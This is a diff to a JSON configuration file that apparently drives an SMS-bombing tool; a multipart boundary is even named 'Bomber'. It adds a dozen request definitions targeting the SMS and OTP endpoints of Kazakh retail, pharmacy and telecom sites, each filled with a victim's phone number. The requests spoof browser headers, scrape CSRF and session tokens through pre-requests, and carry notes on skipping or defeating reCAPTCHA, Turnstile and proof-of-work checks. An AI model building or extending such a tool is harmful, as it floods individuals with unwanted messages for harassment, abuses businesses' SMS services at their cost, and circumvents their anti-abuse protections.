@@ -441,6 +441,286 @@
       "body": "{\"type\":\"sms\",\"phone\":\"{phone_national}\",\"token\":\"\"}",
       "enabled": true,
       "_note": "token field is Turnstile captcha — will 403 without a valid solve. Try empty string first; some endpoints skip enforcement."
+    },
+    {
+      "name": "lensmark_kz_register_sms",
+      "channel": "sms",
+      "priority": 1,
+      "method": "POST",
+      "url": "https://lensmark.kz/user/send_register_sms",
+      "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+      "headers": {
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Accept-Language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7",
+        "Origin": "https://lensmark.kz",
+        "Referer": "https://lensmark.kz/user/register",
+        "X-Requested-With": "XMLHttpRequest",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin"
+      },
+      "body": "phone={phone_display_enc}",
+      "enabled": true
+    },
+    {
+      "name": "choco_kz_user_code",
+      "channel": "sms",
+      "priority": 1,
+      "method": "POST",
+      "url": "https://api-proxy.choco.kz/api/v5/user/code",
+      "content_type": "application/vnd.api+json",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7",
+        "Origin": "https://oauth.choco.kz",
+        "Referer": "https://oauth.choco.kz/",
+        "X-Language": "ru",
+        "X-Requested-With": "XMLHttpRequest",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-site"
+      },
+      "body": "{\"data\":{\"attributes\":{\"login\":\"{phone_raw}\",\"client_id\":-5,\"dispatch_type\":\"auto\",\"term_uuids\":[\"d8c18bd9-a1f6-40e5-8ae9-ac66ee22f4bc\",\"a2a3bd42-654a-4d30-ba77-6c29eebf0062\"]},\"id\":\"50665d8a-5715-4baa-bcd0-76d314ccf194\",\"type\":\"code\"}}",
+      "enabled": true,
+      "_note": "x-recaptcha-response header needed — try without first"
+    },
+    {
+      "name": "europharma_kz_signup",
+      "channel": "sms",
+      "priority": 1,
+      "method": "POST",
+      "url": "https://europharma.kz/signup",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7",
+        "Origin": "https://europharma.kz",
+        "Referer": "https://europharma.kz/signup",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-User": "?1"
+      },
+      "pre_request": {
+        "url": "https://europharma.kz/signup",
+        "method": "GET",
+        "extract": {
+          "type": "regex",
+          "pattern": "name=\"_csrf-frontend\" value=\"([^\"]+)\"",
+          "into": "{csrf_frontend}"
+        }
+      },
+      "body": "_csrf-frontend={csrf_frontend}&SignupForm%5Bname%5D=user&SignupForm%5Bphone%5D={phone_display_enc}&SignupForm%5Bpassword%5D=Qwerty123&SignupForm%5BverifyCode%5D=&signup-button=",
+      "enabled": true,
+      "_note": "verifyCode is recaptcha — may fail without solver. CSRF via pre_request."
+    },
+    {
+      "name": "satu_kz_register",
+      "channel": "sms",
+      "priority": 1,
+      "method": "POST",
+      "url": "https://my.satu.kz/remote/auth/register_customer?locale=ru",
+      "content_type": "application/json; charset=UTF-8",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7",
+        "Origin": "https://satu.kz",
+        "Referer": "https://satu.kz/",
+        "X-Requested-With": "XMLHttpRequest",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-site"
+      },
+      "body": "{\"phone\":\"{phone}\",\"otp\":\"\",\"first_name\":\"user\",\"last_name\":\"test\",\"source\":\"user_sidebar\",\"subscription\":\"false\",\"skip_name\":\"false\"}",
+      "enabled": true,
+      "_note": "POW fields stripped — needs proof-of-work solver"
+    },
+    {
+      "name": "fmobile_kz_authsms",
+      "channel": "sms",
+      "priority": 1,
+      "method": "POST",
+      "url": "https://fmobile.kz/api/personal-account-authsms-post",
+      "content_type": "application/json",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7",
+        "Origin": "https://fmobile.kz",
+        "Referer": "https://fmobile.kz/",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin"
+      },
+      "body": "{\"customerPhone\":\"{phone_raw}\"}",
+      "enabled": true
+    },
+    {
+      "name": "monamie_kz_request_code",
+      "channel": "sms",
+      "priority": 1,
+      "method": "POST",
+      "url": "https://www.monamie.kz/bitrix/services/main/ajax.php?mode=class&c=monamie%3Abff.auth&action=requestCode",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7",
+        "Origin": "https://www.monamie.kz",
+        "Referer": "https://www.monamie.kz/",
+        "BX-Ajax": "true",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin"
+      },
+      "pre_request": {
+        "url": "https://www.monamie.kz/",
+        "method": "GET",
+        "extract": {
+          "type": "regex",
+          "pattern": "sessid\":\"([a-f0-9]+)\"",
+          "into": "{sessid}"
+        }
+      },
+      "body": "phone={phone_national}&language=ru&SITE_ID=s1&sessid={sessid}",
+      "enabled": true
+    },
+    {
+      "name": "intertop_kz_send_otp",
+      "channel": "sms",
+      "priority": 1,
+      "method": "POST",
+      "url": "https://front-api.intertop.kz/authApiV2/sendPhoneOtp",
+      "content_type": "application/json",
+      "headers": {
+        "Accept": "application/json",
+        "Accept-Language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7",
+        "Origin": "https://intertop.kz",
+        "Referer": "https://intertop.kz/",
+        "X-Locale": "ru-kz",
+        "X-Site": "kz",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-site"
+      },
+      "body": "[{\"phone\":\"{phone}\",\"clientFlow\":\"auth\",\"recaptchaToken\":\"\"}]",
+      "enabled": true,
+      "_note": "recaptchaToken required — try empty first"
+    },
+    {
+      "name": "yk_kz_register",
+      "channel": "sms",
+      "priority": 1,
+      "method": "POST",
+      "url": "https://yk.kz/assets/components/app/connector.php?action=web/users/registration/step_one&ctx=web",
+      "content_type": "multipart/form-data; boundary=----WebKitFormBoundaryBomber",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7",
+        "Origin": "https://yk.kz",
+        "Referer": "https://yk.kz/office/register.html",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin"
+      },
+      "body": "------WebKitFormBoundaryBomber\r\nContent-Disposition: form-data; name=\"fullname\"\r\n\r\nuser\r\n------WebKitFormBoundaryBomber\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n{phone_display}\r\n------WebKitFormBoundaryBomber\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n\r\n------WebKitFormBoundaryBomber\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\nQwerty123\r\n------WebKitFormBoundaryBomber\r\nContent-Disposition: form-data; name=\"password_confirm\"\r\n\r\nQwerty123\r\n------WebKitFormBoundaryBomber\r\nContent-Disposition: form-data; name=\"accept\"\r\n\r\n1\r\n------WebKitFormBoundaryBomber\r\nContent-Disposition: form-data; name=\"mode\"\r\n\r\nphone\r\n------WebKitFormBoundaryBomber--\r\n",
+      "enabled": true
+    },
+    {
+      "name": "simka_kz_otp_start",
+      "channel": "sms",
+      "priority": 1,
+      "method": "POST",
+      "url": "https://simka.kz/app/app_api.php",
+      "content_type": "application/json",
+      "headers": {
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7",
+        "Origin": "https://simka.kz",
+        "Referer": "https://simka.kz/kabinet",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin"
+      },
+      "body": "{\"action\":\"otp_start\",\"lang\":\"ru\",\"tel\":\"{phone_raw}\",\"purpose\":\"seller\"}",
+      "enabled": true
+    },
+    {
+      "name": "dprav_kz_send_code",
+      "channel": "sms",
+      "priority": 1,
+      "method": "POST",
+      "url": "https://d-prav.kz/bitrix/components/bxmaker/authuserphone.login/ajax.php",
+      "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+      "headers": {
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Accept-Language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7",
+        "Origin": "https://d-prav.kz",
+        "Referer": "https://d-prav.kz/personal/",
+        "X-Requested-With": "XMLHttpRequest",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin"
+      },
+      "pre_request": {
+        "url": "https://d-prav.kz/personal/",
+        "method": "GET",
+        "extract": {
+          "type": "regex",
+          "pattern": "sessid\":\"([a-f0-9]+)\"",
+          "into": "{sessid}"
+        }
+      },
+      "body": "parameters=YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30%3D.c90c34709f805582c0e8c827e654b936b1030f6d70ca1fc8cecffaa068c21eb0&template=.default.6b5de42f94a4303cf649c8f884960b78e2e6b90e672926224cbf9de88e619190&siteId=s1&sessid={sessid}&method=sendCode&phone={phone_display_enc}&registration=Y&fio=user",
+      "enabled": true,
+      "_note": "Bitrix signed params static per component. sessid via pre_request."
+    },
+    {
+      "name": "kn_kz_login",
+      "channel": "sms",
+      "priority": 1,
+      "method": "POST",
+      "url": "https://m.kn.kz/login/",
+      "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+      "headers": {
+        "Accept": "application/json",
+        "Accept-Language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7",
+        "Origin": "https://m.kn.kz",
+        "Referer": "https://m.kn.kz/login/",
+        "X-Requested-With": "XMLHttpRequest",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin"
+      },
+      "pre_request": {
+        "url": "https://m.kn.kz/login/",
+        "method": "GET",
+        "extract": {
+          "type": "regex",
+          "pattern": "name=\"_token\" value=\"([^\"]+)\"",
+          "into": "{_token}"
+        }
+      },
+      "body": "username={phone_8}&_token={_token}&check_email=",
+      "enabled": true
+    },
+    {
+      "name": "fmedia_kz_otp_request",
+      "channel": "sms",
+      "priority": 1,
+      "method": "POST",
+      "url": "https://auth.fmedia.kz/api/v1/auth/otp/request",
+      "content_type": "application/json",
+      "headers": {
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7",
+        "Origin": "https://auth.fmedia.kz",
+        "Referer": "https://auth.fmedia.kz/ru",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin"
+      },
+      "body": "{\"phone\":\"{phone}\"}",
+      "enabled": true
     }
   ],
   "twilio": {
